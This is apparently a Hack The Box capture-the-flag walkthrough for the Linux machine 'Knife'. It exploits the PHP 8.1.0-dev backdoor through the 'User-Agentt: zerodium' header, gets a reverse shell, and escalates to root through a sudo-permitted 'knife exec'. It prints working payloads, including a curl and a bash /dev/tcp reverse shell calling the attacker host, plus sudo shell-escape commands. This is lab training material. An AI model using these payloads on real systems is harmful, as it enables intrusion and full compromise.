# Hack The Box - Knife

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Knife-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Operating System](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Web](https://img.shields.io/badge/Focus-Web-red?style=for-the-badge)

> **Knife** is an Easy-difficulty Linux machine that features an application running on a backdoored version of PHP. The vulnerable PHP version is exploited to obtain an initial foothold as the `james` user. During privilege escalation, a sudo misconfiguration allows `james` to execute the `knife` utility as root. The `knife exec` functionality is then abused to execute `/bin/sh -i` and obtain a root shell.

---

## Machine Information

| Property | Value |
|---|---|
| **Machine** | **Knife** |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty** | Easy |
| **Target IP** | `10.129.45.7` |
| **Primary Focus** | Web Exploitation |
| **Vulnerability** | PHP 8.1.0-dev Backdoor |
| **Initial Access** | PHP Backdoor → RCE → Reverse Shell |
| **Privilege Escalation** | Sudo Misconfiguration → Knife Exec → Root |

---

# 1. Enumeration

## 1.1 Nmap

I started with a full TCP port scan to identify all exposed services.

   nmap -sV -sS -sC --min-rate 5000 10.129.45.7 -oN nmap
   nmap -sVC -Pn --min-rate 5000 10.129.45.7 -oG targeted.txt

   
The scan revealed two open ports.

The main service of interest was the web server running Apache2.

---

# 2. Web Enumeration

## 2.1 Port 80 - Apache

Browsing to:

    http://10.129.45.7

revealed an **Emergent Medical Idea** application.

No immediately useful information was found in the application itself.

---

## 2.2 FFUF

I performed directory and file enumeration using FFUF.

    ffuf -u http://10.129.45.7/FUZZ -w /usr/share/wordlists/dirb/common.txt

The enumeration did not reveal anything particularly useful.

---

# 3. PHP Version Discovery

Since the web application did not expose anything interesting, I inspected the HTTP response headers.

    curl -I http://10.129.45.7/index.php

The `X-Powered-By` header revealed that the server was running:

    PHP/8.1.0-dev

Searching for vulnerabilities affecting this version revealed that PHP `8.1.0-dev` was released with a backdoor.

The backdoor was introduced through malicious commits to the PHP source repository and was subsequently discovered and removed.

---

# 4. PHP 8.1.0-dev Backdoor

The backdoor checks the `User-Agentt` HTTP request header for the string:

    zerodium

If the string is found, the code following it is passed to `zend_eval_string()`, allowing arbitrary PHP code execution.

This makes the vulnerable PHP version directly exploitable for Remote Code Execution.

---

# 5. RCE Verification

To verify the vulnerability, I started a Python HTTP server on the attacking machine.

    sudo python3 -m http.server 80

Then I sent a request containing the malicious `User-Agentt` header.

    curl http://10.129.45.7/index.php -H 'User-Agentt: zerodiumsystem("curl 10.10.14.65");'

The attacking machine's IP address should be replaced with the appropriate `tun0` IP.

Receiving the request confirmed that arbitrary commands could be executed through the PHP backdoor.

---

# 6. Initial Access

After confirming the RCE, I started a Netcat listener on port `1234`.

    nc -nlvp 1234

I then used the PHP backdoor to execute a reverse shell.

    curl http://10.129.45.7/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i &>/dev/tcp/10.10.14.65/1234 0>&1 '\");"

Again, `10.10.14.65` represents the attacking machine's IP address and should be replaced with the correct `tun0` address.

The exploit was successful and returned a shell as:

    james

This provided the initial foothold on the machine.

<img width="953" height="186" alt="image" src="https://github.com/user-attachments/assets/8da64320-7ad9-48e0-8137-6cba23101c6a" />


---

# 7. Shell Upgrade

The initial reverse shell was upgraded to a more stable interactive shell using Python.

    python3 -c 'import pty;pty.spawn("/bin/bash")'

The shell was then suspended:

    CTRL + Z

On the attacking machine:

    stty raw -echo
    fg

After returning to the shell:

    reset

Then:

    xterm

This provided a more fully interactive terminal and allowed keyboard shortcuts to function correctly.

---

# 8. Privilege Escalation

With a foothold as `james`, I enumerated the available sudo permissions.

    sudo -l

The output showed that the `james` user was allowed to execute the `knife` utility as root.

The relevant sudo permission was:

    (ALL, !root) /usr/bin/knife

<img width="956" height="166" alt="image" src="https://github.com/user-attachments/assets/5d258dd6-51a1-4e85-84e8-b7cff16f574f" />



The **Knife** utility provides an interface for managing Chef automation server nodes, cookbooks, recipes and other Chef-related objects.

This sudo permission provided the privilege escalation vector.

---

# 9. Knife Privilege Escalation

Knife provides an `exec` subcommand that can execute Ruby code.

Instead of using the `vi` editor method, I used the `knife exec` functionality directly.

The command used was:

    sudo knife exec --exec "exec '/bin/sh -i'"

The `exec` Ruby method executes `/bin/sh -i`.

Because Knife was executed through `sudo`, the resulting shell was spawned with elevated privileges.

This successfully resulted in a root shell.


<img width="961" height="106" alt="image" src="https://github.com/user-attachments/assets/016f6592-1f78-4f40-a17d-43a15f7a06f6" />


---

# 10. Root Access

After executing:

    sudo knife exec --exec "exec '/bin/sh -i'"

I verified the current user:

   id

The result was:

  uid=0(root) gid=0(root) groups=0(root)

This confirmed successful privilege escalation.

The complete privilege escalation was therefore:

    james
      |
      v
    sudo -l
      |
      v
    /usr/bin/knife
      |
      v
    sudo knife exec --exec "exec '/bin/sh -i'"
      |
      v
    root

---

# 11. Alternative Knife Escalation

Another privilege escalation method documented for this machine involves abusing Knife's ability to launch a text editor.

The following command can be used:

    sudo knife data bag create 1 2 -e vi

This opens the Vim editor with root privileges.

Inside Vim, the following command can be used:

    :!/bin/sh

This launches a shell from Vim and results in a root shell.

I did not use this method for my compromise; the method I used was the direct `knife exec` approach:

    sudo knife exec --exec "exec '/bin/sh -i'"

---

# 12. Attack Chain

    Nmap
      |
      v
    Apache / Web Application
      |
      v
    HTTP Header Enumeration
      |
      v
    PHP 8.1.0-dev
      |
      v
    PHP Backdoor
      |
      v
    User-Agentt: zerodium
      |
      v
    Remote Code Execution
      |
      v
    Reverse Shell
      |
      v
    james
      |
      v
    sudo -l
      |
      v
    Knife allowed as root
      |
      v
    sudo knife exec --exec "exec '/bin/sh -i'"
      |
      v
    ROOT

---

# 13. Credentials

| Username | Password | Source |
|---|---|---|
| `james` | Not required | PHP 8.1.0-dev RCE |

No password was required to obtain the initial foothold because the PHP backdoor provided direct command execution.

---

# 14. Key Findings

## PHP 8.1.0-dev Backdoor

The target was running:

    PHP/8.1.0-dev

This development version contained a backdoor that allowed arbitrary PHP code execution through the `User-Agentt` header.

---

## Remote Code Execution

The backdoor was triggered using:

    User-Agentt: zerodium

Commands could then be executed after the `zerodium` string.

---

## Sudo Misconfiguration

The `james` user was allowed to execute the `knife` utility with elevated privileges.

    sudo -l

This created the main privilege escalation path.

---

## Knife Exec

The `knife exec` functionality allowed Ruby code to be executed with the privileges of the Knife process.

The following command was used to obtain the root shell:

    sudo knife exec --exec "exec '/bin/sh -i'"

This resulted in:

    root

---

# 15. Flags

| Flag | Location |
|---|---|
| **User** | `/home/james/user.txt` |
| **Root** | `/root/root.txt` |

---

# 16. Tools Used

- Nmap
- cURL
- FFUF
- Netcat
- Python
- Apache
- PHP
- Knife
- Bash

---

# 17. MITRE ATT&CK Techniques

| Technique | Description |
|---|---|
| **T1046** | Network Service Scanning |
| **T1190** | Exploit Public-Facing Application |
| **T1059.004** | Unix Shell |
| **T1059.006** | Python |
| **T1548.003** | Sudo and Sudo Caching |
| **T1068** | Exploitation for Privilege Escalation |

---

# 18. Lessons Learned

1. Always inspect HTTP response headers during web enumeration.
2. Version information such as `X-Powered-By` can reveal vulnerable software.
3. Development versions of software should be treated carefully because they may contain serious vulnerabilities or compromised code.
4. The PHP 8.1.0-dev backdoor demonstrates how a compromised software release can result in direct Remote Code Execution.
5. After obtaining a foothold on Linux, always enumerate `sudo -l`.
6. Sudo permissions should be carefully reviewed for binaries capable of executing commands or arbitrary code.
7. Application-specific utilities such as Knife can become privilege escalation vectors when incorrectly configured in sudoers.
8. The `knife exec` functionality can be abused to execute a shell with the privileges of the Knife process.
9. Shell stabilization is useful when working with reverse shells because it provides a more reliable interactive terminal.

---

# 19. Final Summary

Knife is an Easy-difficulty Linux machine that demonstrates how a vulnerable software version can be chained with a sudo misconfiguration to obtain complete system compromise.

The attack begins with Nmap enumeration, identifying the web service running on port 80. Inspecting the HTTP response headers reveals that the server is running `PHP/8.1.0-dev`.

This specific development version was released with a backdoor that checks the `User-Agentt` header for the `zerodium` string. When the string is present, the code following it is evaluated, providing arbitrary command execution.

The RCE is used to obtain a reverse shell as the `james` user.

After gaining the initial foothold, `sudo -l` reveals that `james` can execute `/usr/bin/knife` with elevated privileges.

Rather than using the editor-based escalation, I used Knife's `exec` functionality directly:

    sudo knife exec --exec "exec '/bin/sh -i'"

The command executes `/bin/sh -i` with the privileges granted to Knife, resulting in a root shell.

The complete attack can therefore be summarized as:

    PHP 8.1.0-dev
           |
           v
       Backdoor
           |
           v
    User-Agentt: zerodium
           |
           v
    Remote Code Execution
           |
           v
      Reverse Shell
           |
           v
          james
           |
           v
        sudo -l
           |
           v
    Knife as root
           |
           v
    knife exec
           |
           v
          ROOT

**Target:** `10.129.45.7`  
**Machine:** Knife  
**Difficulty:** Easy  
**OS:** Linux  
**Focus:** Web Exploitation · PHP Backdoor · Sudo Misconfiguration · Privilege Escalation
